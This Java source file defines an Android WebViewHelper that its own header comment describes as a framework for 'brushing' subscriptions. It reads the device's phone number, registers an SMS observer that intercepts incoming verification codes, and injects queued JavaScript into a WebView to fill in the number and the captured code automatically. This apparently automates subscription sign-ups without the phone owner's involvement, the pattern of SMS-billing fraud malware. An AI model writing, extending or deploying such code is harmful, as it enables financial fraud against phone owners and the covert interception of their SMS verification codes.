package moziqi.interviewdemo.webview;

import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewGroup;
import android.view.ViewParent;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.BlockingQueue;

import moziqi.interviewdemo.subscribe.PhoneUtils;
import moziqi.interviewdemo.subscribe.SmsObserver;

/**
 * 作者 : moziqi
 * 邮箱 : 709847739@qq.com
 * 时间   : 2019/7/26-11:26
 * desc   : 用于刷订阅之类的框架
 * version: 1.0
 */
public class WebViewHelper {


    /**
     * webView控件
     */
    private final TouchWebView localWebView;

    /**
     * 弱应用的handler
     */
    private final InnerHandler handler;

    /**
     * 本次执行js的队列
     */
    private BlockingQueue<WebData> mWebDatas;

    /**
     * 当前次数
     */
    private int reloadCount = 0;

    /**
     * 重试次数
     */
    private final static int RELOAD_COUNT = 3;

    /**
     * 针对当前一个webData对象，放进去执行的js
     */
    private List<JsObj> runningJs = new ArrayList<>();

    /**
     * 用于获取短信验证码
     */
    private SmsObserver smsObserver = null;


    /**
     * 本机电话号码
     */
    private String phoneNum = null;
    /**
     * 短信验证码
     */
    private String code = null;

    /**
     * 传递webView进来，用于控制
     *
     * @param webView
     */
    public WebViewHelper(TouchWebView webView) {
        this.localWebView = webView;
        this.handler = new InnerHandler(this);
        smsObserver = new SmsObserver(webView.getContext(), handler);
        //监听短信
        if (smsObserver != null) {
            SmsObserver.registerContentObserver(webView.getContext(), smsObserver);
        }
        //设置电话号码
        String tempPhoneNum = PhoneUtils.getPhoneNum(webView.getContext());
        if (!TextUtils.isEmpty(tempPhoneNum)) {
            this.phoneNum = tempPhoneNum;
        } else {
            //设置随机电话号码
            StringBuilder phoneNumBuilder = new StringBuilder();
            for (int i = 0; i < 11; i++) {
                phoneNumBuilder.append(getRandom(9));
            }
            this.phoneNum = phoneNumBuilder.toString();
        }
        //设置随机验证码
        StringBuilder codeBuilder = new StringBuilder();
        for (int i = 0; i < 6; i++) {
            codeBuilder.append(getRandom(9));
        }
        code = codeBuilder.toString();
    }


    /**
     * 设置数据
     *
     * @param webDatas
     */
    public WebViewHelper setData(BlockingQueue<WebData> webDatas) {
        mWebDatas = webDatas;
        handler.removeCallbacksAndMessages(null);
        return this;
    }

    /*
     *启动工作
     */
    public void start() {
        if (mWebDatas == null || mWebDatas.isEmpty()) {
            return;
        }
        //重置次数
        reloadCount = 0;
        //清除runningJs
        runningJs.clear();
        //判断handler是否为null
        if (handler == null) {
            return;
        }
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    //获取一个web对象
                    final WebData webData = mWebDatas.poll();
                    if (localWebView != null && webData != null) {
                        localWebView.loadURL(webData.loadUrl);
                        localWebView.setSimulationListener(new SimulationListener() {
                            @Override
                            public void doSimulation() {
                                doJs(webData, 0);
                            }

                            @Override
                            public void onPageFinished(String url) {

                            }

                            @Override
                            public void onError(String url) {
                                if (reloadCount < RELOAD_COUNT) {
                                    //5s内再执行
                                    if (handler != null) {
                                        handler.postDelayed(new Runnable() {
                                            @Override
                                            public void run() {
                                                if (localWebView != null) {
                                                    localWebView.reload();
                                                    //当没仔细过，重复执行
                                                    runningJs.clear();
                                                    //增加次数
                                                    reloadCount++;
                                                }
                                            }
                                        }, 1000 * 5);
                                    }
                                } else {
                                    //执行下一个
                                    next();
                                }
                            }
                        });
                    }
                } catch (Exception e) {
                    Log.e("mo", "start", e);
                }
            }
        });

    }

    /**
     * 执行js
     *
     * @param webData
     * @param pos
     */
    private void doJs(final WebData webData, final int pos) {
        if (webData == null) {
            next();
            return;
        }
        List<JsObj> jsQueues = webData.jsQueues;
        int size = jsQueues.size();
        if (pos >= size) {
            Log.i("mo", "doJs start");
            //执行下一个
            next();
            return;
        }
        final JsObj poll = jsQueues.get(pos);
        if (!runningJs.contains(poll)) {
            //判断js是否执行过了
            runningJs.add(poll);
            Log.i("mo", String.format("doJs pos is %s", pos));
            if (handler != null) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (webData.postHtml == 1) {
                            //这里为了上报js，读取页面出来，用于分析内容
                            localWebView.getHtml();
                        }
                        localWebView.getLoadCompete();
                        String jsContent = null;
                        Log.i("mo", String.format("doJs poll.type is %d", poll.type));
                        switch (poll.type) {
                            case 0:
                                //是不处理
                                jsContent = poll.js;
                                break;
                            case JsObj.JS_TYPE_PHONE:
                                //获取联系电话号码
                                jsContent = String.format(poll.js, phoneNum);
                                break;
                            case JsObj.JS_TYPE_CODE:
                                //获取短信验证码
                                jsContent = String.format(poll.js, code);
                                break;
                            case JsObj.JS_TYPE_RANDOM:
                                //设置随机数,暂时在能0-4范围内
                                jsContent = String.format(poll.js, getRandom(5));
                                break;
                            default:
                                //默认不处理
                                jsContent = poll.js;
                                break;
                        }
                        localWebView.loadJs(jsContent);
                        //继续执行
                        doJs(webData, pos + 1);
                    }
                }, poll.delayTime);
            }
        } else {
            //继续下一组js
            Log.i("mo", "doJs contains pos");
            if (handler != null) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        doJs(webData, pos + 1);
                    }
                }, poll.delayTime);
            }
        }
    }

    private void next() {
        if (handler != null) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    start();
                }
            }, 5000);
        }
    }


    /**
     * 创建对象
     *
     * @param postHtml
     * @param loadUrl
     * @param jsQueues
     * @return
     */
    public WebData createWebData(int postHtml, String loadUrl, List<JsObj> jsQueues) {
        WebData temp = new WebData(postHtml, loadUrl, jsQueues);
        return temp;
    }

    /**
     * 创建对象
     *
     * @param js
     * @return
     */
    public JsObj createJsObj(String js) {
        JsObj temp = new JsObj(js);
        return temp;
    }

    /**
     * 创建对象
     *
     * @param js
     * @param delayTime
     * @return
     */
    public JsObj createJsObj(String js, int delayTime) {
        JsObj temp = new JsObj(js, delayTime);
        return temp;
    }


    /**
     * 创建对象
     *
     * @param js
     * @param delayTime
     * @param type
     * @return
     */
    public JsObj createJsObj(String js, int delayTime, int type) {
        JsObj temp = new JsObj(js, delayTime, type);
        return temp;
    }

    /**
     * 获取随机数
     *
     * @param bound
     * @return
     */
    public int getRandom(int bound) {
        Random random = new Random();
        int nextInt = random.nextInt(bound);
        return nextInt;
    }

    /**
     * 停止webView
     */
    public void onDestroy() {
        if (localWebView != null) {
            ViewParent parent = localWebView.getParent();
            if (parent != null && parent instanceof ViewGroup) {
                ((ViewGroup) parent).removeView(localWebView);
            }
            localWebView.stopLoading();
            // 退出时调用此方法，移除绑定的服务，否则某些特定系统会报错
            localWebView.getSettings().setJavaScriptEnabled(false);
            localWebView.clearHistory();
            localWebView.clearView();
            localWebView.removeAllViews();
            try {
                localWebView.destroy();
            } catch (Throwable ex) {
                //to do
            }
        }
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        if (smsObserver != null) {
            SmsObserver.unregisterContentObserver(localWebView.getContext(), smsObserver);
        }
        smsObserver = null;
    }

    /**
     * 内容
     */
    public static class WebData {
        public int postHtml; //如果是1就是要上报html
        public String loadUrl;
        public int netType;//网络状态
        public List<JsObj> jsQueues;

        public WebData(int postHtml, String loadUrl, List<JsObj> jsQueues) {
            this.postHtml = postHtml;
            this.loadUrl = loadUrl;
            this.jsQueues = jsQueues;
        }

        public WebData(int postHtml, String loadUrl, int netType, List<JsObj> jsQueues) {
            this.postHtml = postHtml;
            this.loadUrl = loadUrl;
            this.netType = netType;
            this.jsQueues = jsQueues;
        }

        public WebData() {
        }
    }

    /**
     * js 相关操作
     */
    public static class JsObj {
        public String js;
        public int delayTime = 15 * 1000;
        public int type;// 0是不需要处理 1需要phone 2需要code短信验证

        public final static int JS_TYPE_PHONE = 1;
        public final static int JS_TYPE_CODE = 2;
        public final static int JS_TYPE_RANDOM = 3;

        public JsObj(String js, int delayTime, int type) {
            this.js = js;
            this.delayTime = delayTime;
            this.type = type;
        }

        public JsObj(String js, int delayTime) {
            this.js = js;
            this.delayTime = delayTime;
        }


        public JsObj(String js) {
            this.js = js;
        }

        public JsObj() {
        }

        @Override
        public boolean equals(Object o) {
            if (this == o) return true;
            if (o == null || getClass() != o.getClass()) return false;

            JsObj jsObj = (JsObj) o;

            if (delayTime != jsObj.delayTime) return false;
            if (type != jsObj.type) return false;
            return js.equals(jsObj.js);
        }

        @Override
        public int hashCode() {
            int result = js.hashCode();
            result = 31 * result + delayTime;
            result = 31 * result + type;
            return result;
        }
    }

    /**
     * 实现弱引用
     */
    private static class InnerHandler extends Handler {
        private final WeakReference<WebViewHelper> tWeak;

        public InnerHandler(WebViewHelper t) {
            super(Looper.getMainLooper());
            tWeak = new WeakReference<>(t);
        }

        @Override
        public void handleMessage(Message msg) {
            if (tWeak.get() == null) {
                return;
            }
            switch (msg.what) {
                //获取短信验证码
                case SmsObserver.MSG_RECEIVED_CODE:
                    if (msg.obj != null
                            && msg.obj instanceof String) {
                        tWeak.get().code = (String) msg.obj;
                    }
                    break;
                default:
                    break;
            }
        }
    }

}
